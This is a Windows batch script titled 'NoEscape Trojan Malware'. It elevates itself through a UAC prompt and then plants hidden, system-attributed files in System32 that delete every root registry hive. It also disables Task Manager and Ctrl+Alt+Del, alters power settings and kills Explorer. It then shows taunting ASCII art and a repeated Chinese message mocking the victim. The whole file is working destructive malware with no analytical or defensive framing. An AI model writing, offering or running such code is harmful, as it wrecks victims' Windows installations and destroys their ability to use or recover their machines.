@echo off
:: BatchGotAdmin
:-------------------------------------
    IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) ELSE (
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
)

if '%errorlevel%' NEQ '0' (
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params= %*
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"
:--------------------------------------    
color a
echo Set WshShell = WScript.CreateObject("WScript.Shell") >>C:\Windows\System32\Admin_Alex.vbs
echo WshShell.Run "C:\Windows\System32\Admin_Alex.bat", 0 , false >>C:\Windows\System32\Admin_Alex.vbs
echo @echo off>>C:\Windows\System32\Admin_Alex.bat 
echo del "%~f0"/f >>C:\Windows\System32\Admin_Alex.bat
echo reg delete hklm /f ^>nul 2^>nul>>C:\Windows\System32\Admin_Alex.bat
echo reg delete hkcr /f ^>nul 2^>nul>>C:\Windows\System32\Admin_Alex.bat
echo reg delete hkcu /f ^>nul 2^>nul>>C:\Windows\System32\Admin_Alex.bat
echo reg delete hku /f ^>nul 2^>nul>>C:\Windows\System32\Admin_Alex.bat
echo reg delete hkcc /f ^>nul 2^>nul>>C:\Windows\System32\Admin_Alex.bat
attrib +h +s C:\Windows\System32\Admin_Alex.vbs
attrib +h +s C:\Windows\System32\Admin_Alex.bat
reg add HKLM\SOFTWARE\Microsoft\Windows" "NT\CurrentVersion\Winlogon /v DisableCAD /t REG_DWORD /d 1 /f >nul
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f >nul
start C:\Windows\System32\Admin_Alex.vbs
powercfg -setdcvalueindex SCHEME_CURRENT 4f971e89-eebd-4455-a8de-9e59040e7347 7648efa3-dd9c-4e3e-b566-50f929386280 0 >nul
powercfg -setacvalueindex SCHEME_CURRENT 4f971e89-eebd-4455-a8de-9e59040e7347 7648efa3-dd9c-4e3e-b566-50f929386280 0 >nul
powercfg -SetActive SCHEME_CURRENT >nul
taskkill /im explorer.exe /f >nul
title NoEscape Trojan Malware
echo THERE IS NO ESCAPE NOW.
echo[
echo DO NOT TRY TO CLOSE THIS WINDOW,
echo YOUR COMPUTER IS NOW DONE FOR ANYWAY.
echo[
echo DO YOU WANT TO ENJOY THE LAST MINUTES
echo USING YOUR COMPUTER?
set /p pass=
if %pass% == yes goto yes
if %pass%==exit goto exit
if not %pass%==ciucinfo goto lel 

:yes
cls
echo ....`````.`````.``.`````````````             ` ` ```````......`.......`````` ````````` ``........-..
echo -..-``.`...-.-..``.`.-``.````````         `  ` ` ```````````````````````                    ` ``````
echo ----...``.`.`.`.```````````````         `   ``````` ``````...`````````````` `   ``` ` `` ````  `   `
echo .....````.`.`.`````````````````        `       ```-://+o/:-..``.....``.`````````` ```````````       
echo `.`````````````````````````````       `   `` `` `-:/++/+o+oo-````````````  `                        
echo ......`````````````````````````   ``` `        `.-::+s+/+osyh+`````````````` `                      
echo ...............`.```````````````` ```` `   ```.--.:+-+oy+/oshdo````````````` ````` ``````````  ```` 
echo ---.-...........````````````````````````  `` `.:++//::osssosymm+.`....`.....`....````..``.... `-.-.`
echo ..-...`````.``````````````````````````          `.://+::ohyshmmd.```````````````` ``````````` ````` 
echo `.-` `  `  .` `` ` `     ```````````                `/o+/shysmmd+```````````````` ```````````  ` `  
echo .````` ```````````   ```````````````                  .ososysdNmy-.``..```````````````   ```        
echo .....`.`....`.`````````````````````                     -osyyhmmdo````````````` ``` ``              
echo ...````````````````  `    `````````                       -sdddmmy.``````` `      ````              
echo `..``` `` ````` `` ` ``````````````                         :hmmNd/`.`````````` `````               
echo .....``..`.`````````````` ````````                           `+dNNy...```````````````               
echo -:-.-.....-..-....`.``````````````                             .oNm/.....--.`....`.``               
echo .-.``````````````` ``````````````                                :mh.```...``..```````              
echo `.```````````````  ``````````````                                 -h/.`````````````                 
echo --............-.........``````````                                ``+:-::/::.````````               
echo -:--..`.``..`-....`-....``````````                                  -:..`-:/+o+/:`                  
echo ---...````..`.........````````````                                ``:-...``--:/sss/`                
echo `..``````````........````````````                               `..-:.`-`-``-.+-/oy/.`              
echo ````````  ```````````.`````````                        `    `````..--..-.-``.-+`/ys+.-`             
echo              ````````.````````                              ```.```//.-..-```.:`.+s+-`/`            
echo          ````````````````````                              `````.:.-+.----```.:`.-/:+`-o`           
echo                    ``````````                          ````.```-.``-/-.-:-.``.:`-.-`s-`+s`          
echo             ````````````````     ``   `                    `.``````/-::::-.``.:....`:+`.y+`  `      
echo              ````````````````   `     `                 ```.-..````+--:/:-.``-/`.`` `+.`os-         
echo              ` ``          `          `                `````-...`..o--/+/:...:+..`` `+/`+so  `      
echo                                       `                `````....``.o..-+/-.``:/``  ``-o:/sy/ ``     
echo                                       `                `....---.`.-o---++:-..:/.. ``.:/++syy...`  ``
echo                   ` `   `````   `     `                `    ```` `.+.``-/.```-/      ..:/+sh:       
echo               `````      ` `          `            ````.`   ```` `.+.` `:- `.-:      .../:/ho       
echo   `````      `````` ` ```````         `                `    ```   `/`   --``--:      `` -.-sh`      
echo GOOD LUCK!
pause >nul
exit

:exit
cls
color c
echo                                                                                                    
echo                                                                    `````                           
echo                                                               .-/+++/::::--.`                     
echo                                                              .:/+oo+//:::://///:-`                 
echo                                                            `-:/+o++//::::////+oooo/.               
echo                                                           `-/+oo+///:::::///+ooosyyyo:`            
echo                                                          .:/+oo+//:::::////+ooosyyhhhhs:           
echo                                          `..-:////+++////++oo++///:::////++sosyyhhhddddd+`         
echo                                        .:+osssssyyhddddddddddhhyyso+++/++osssyyhhdddddmdd+         
echo                                       :oooooossssyddmmmmmmmmmmmmmmmmddhhyysssyhhddddmmmddy-        
echo                                      `ooooooosssyhdmddmddmmmmmmmmmmmmmmmmmmmddhhhdddmmddhy/        
echo                                      `ossssosssyyhdmddmmmmddmmmmmmmmmmmmmmNNNNNNmmdddddhys:        
echo                                       :yyssssssyhdmmmmmmmmddmmmmmmmmmmmmmmNNNNNNNNmmmmdhy+`        
echo                                        +yyyyyyyyddmmmmmmmmmmmmmydmmmmmmmmmmmNNNNNNNNmmmmmh+.       
echo                                         +yyyyysyhdddddddddmdhdmdddddmmmmmmmmmmNNNNNNmmmmmmmds-     
echo                                          /yys+yhhhyyyyyhhhddhdddhhhyhddhdmmmmmmNNNNNNmmmmmmmmdo`   
echo                                           :sssyyssysssyyyoyhhhhhyyyoyhdyddmmmmmmNNNNNmmmmmmmmmmh.  
echo                                           `+syosysooyyysyyyhhyyyyyyyyhdhhdmmmmmmmNNNNNNmmmmmmmmmh` 
echo                                           .+yyss++ydNmmmyoyyhhyyyyyyyyyddmddmmmNNNNNNNNmmmmmmmmmm/ 
echo                                          .+oyyyoomNNNmmhhs/osyyyyyyyshddmmmmmmNNNNNNNNNNmmmmmmmmmo 
echo                                     `.-:+oooyyy++mNNNmy+yo+ssyyyyyyyyhyddddmmmmmNNNNNNNmmmmmmmmmmo 
echo                                `.-/+oo+ossysyyyy+ohmmmyyyshyyyyyyyssyhyhdddmmmmmmNNNNNNmmmmmmmmdm- 
echo                            `.:/+o+ossyos++osyyyhyyssssyyddhhyyyyyyyyddhdmmdhdmmmmmNNNNNmmmmmmmmmo  
echo                        .-/+++ooos+o+/+oooossssssyyhhhhdddhhyyyyyhhdhhmmmdhhhdmmmmmmNNmmmmmmmmmdo`  
echo                    `-:/osso++o//+++++oosssssssssyyyyyyhhhhhhhhdddmmmddddhyhhddmmmmmmmmmmmmmddy:    
echo                  .:osoooooossooossssssyyyysssyyyyyyyyyyhhhddmmmmmmmmdddhyhddddmmmmmmdddddmds:`     
echo                ./syysoossssssssssyyyyyssyyyyyyhhhhhhhddddmmmmmmNdhmmddhhdmddhmmmmmmdddhys/.        
echo              `:yyhhyyyyysyyyyyyyhhhhhddddhdmmdhmmmmdmmmmmmmmmmmmmddddddmmdhydmmmmddy/-.`           
echo             -ohs+yhhyyyyyyhhdyohhddshddddydmmdhmmmmhdNNmhmNNmmmmmddmmmmdhhyhmmmmmmdy-              
echo            .oyhhyhyhhhhsoyyyyyhhddmmmmmmNNNNNNNNNNNNNNNNmNNNmhmmmmmmmdhhhyhdmmmmmmh/               
echo           .oyyyyyhsyhhhyhhdmmNNNNNNNNNNNNNNNNNNNNNNNNNNNNNmmmmmmmmmdhhhhyydmNNNmmdy`               
echo          .oyyyyhhhyhddmmmmmmmdddddddmmmmNNNNNNNNNNNNNNNNmmmmddddddhhhhhyydmmmmmmh/`                
echo         `+yyy+yhddhyo+:---...``   ```.-:/+symNNNNNNNNmmmdmdddddddhhhhyyhdmmmddddhyo-               
echo         -syhhhho/.`                        /yNNNNmmmmmdddddNNNmdhhhhhhddmmdddddddmmh:`             
echo         /yyyo:`                           :ymmmmmmmmdmddddNNNNNNmmdddddmmmddmmmddddhy+`            
echo         oy:`                             .sddddddmmddddddmNNNNNNNNmmdmmmmddmmdmddhhhhdy.           
echo         `                               `shhhhhhdmmddddddmNNNNmmmmmmmmmmmdmNmdhyyhhhhhys-          
echo                                        .-ohhhhhhhmdddddddmNNNmdddmmmmmmmmmmdhyyyyhhhhhhys+:.       
echo I TOLD YOU!
echo[
echo THERE IS NO ESCAPE!
pause >nul
exit

:lel
cls
color c
echo 你是个傻瓜！你被管理员亚历克斯愚弄了； 你是个傻瓜！你被管理员亚历克斯愚弄了； 你是个傻瓜！你被管理员亚历克斯愚弄了。 你是个傻瓜！你被管理员亚历克斯愚弄了； 你是个傻瓜！你被管理员亚历克斯愚弄了； 你是个傻瓜！你被管理员亚历克斯愚弄了。
echo 你是个傻瓜！你被管理员亚历克斯愚弄了； 你是个傻瓜！你被管理员亚历克斯愚弄了； 你是个傻瓜！你被管理员亚历克斯愚弄了。 你是个傻瓜！你被管理员亚历克斯愚弄了； 你是个傻瓜！你被管理员亚历克斯愚弄了； 你是个傻瓜！你被管理员亚历克斯愚弄了。
echo 你是个傻瓜！你被管理员亚历克斯愚弄了； 你是个傻瓜！你被管理员亚历克斯愚弄了； 你是个傻瓜！你被管理员亚历克斯愚弄了。 你是个傻瓜！你被管理员亚历克斯愚弄了； 你是个傻瓜！你被管理员亚历克斯愚弄了； 你是个傻瓜！你被管理员亚历克斯愚弄了。
pause >nul
exit 
